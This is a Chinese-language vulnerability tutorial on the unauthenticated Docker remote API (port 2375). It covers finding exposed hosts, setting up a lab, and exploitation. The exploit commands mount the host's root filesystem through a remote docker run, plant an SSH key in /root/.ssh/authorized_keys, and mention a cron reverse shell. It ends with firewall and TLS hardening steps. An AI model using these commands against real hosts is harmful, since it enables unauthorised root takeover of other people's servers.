***No.1  
***

***漏洞介绍***

Docker daemon api是使用url代替命令行来操作docker，docker swarm 是docker下的集群管理工具，在开放2375端口来监听集群容器时，会调用这个api，可以执行docker命令。

**互联网暴露情况：**

使用sumap查询port:2375来搜索暴露在互联网上开放2375的终端情况

可以看到随便一搜，2375端口所暴露在公网的情况还存在很多，并在在报文中可以看到返回了一些version信息

![](../Images/abec22187ca5e85012ac8b140b1dd064.png)![](../Images/1916531e536a23a998ad4da24f59dfd9.png)

******No.2******

***漏洞复现***

**1、环境复现**  

sudo vim /etc/default/docker  
DOCKER\_OPTS="-H tcp://0.0.0.0:2375"  
sudo systemctl restart docker  

![](../Images/b1e14f381effb0767a9ca565485783bc.png)

2、使用浏览器访问2375端口，通过url的方式调用API，返回{"message":"page not found"}代表存在漏洞

![](../Images/5e490f4205368d2b6b2352760eeb38ae.png)

3、可以使用/version、/info可以查看其他信息

![](../Images/d24b7e282637e8612893de6bbb31e740.png)

******No.3  
******

***漏洞利用***

1、在已经安装docker的vps上，使用-H参数连接目标主机的docker，使用images命令查询目标系统存在的镜像。

docker -H tcp://xx.xx.xx.xx:2375 images  

![](../Images/968dcf754b56e9f58999532c01cd72aa.png)

2、使用docker命令创建一个容器，并将宿主机的磁盘挂载到容器中

docker -H tcp://xx.xx.xx.xx:2375 run -it -v /:/mnt 2eb2d388e1a2 /bin/bash  

![](../Images/700974956480ad60724623f0e01c6aaf.png)

3、在vps上生成公钥，并将其写入到目标机器宿主机的/root/.ssh/authorized\_keys文件中，即可直接免密登录目标机器

![](../Images/7f39fc78d50ae465441d93a0dad9009e.png)![](../Images/a6e6552e6a7e304650fd830158762660.png)

4、如果可以写定时任务，同样也可以通过定时任务来反弹shell

******No.4  
******

***修复加固***

1、使用防火墙，设置ACL，限制来源IP

2、开启TLS，使用证书进行认证
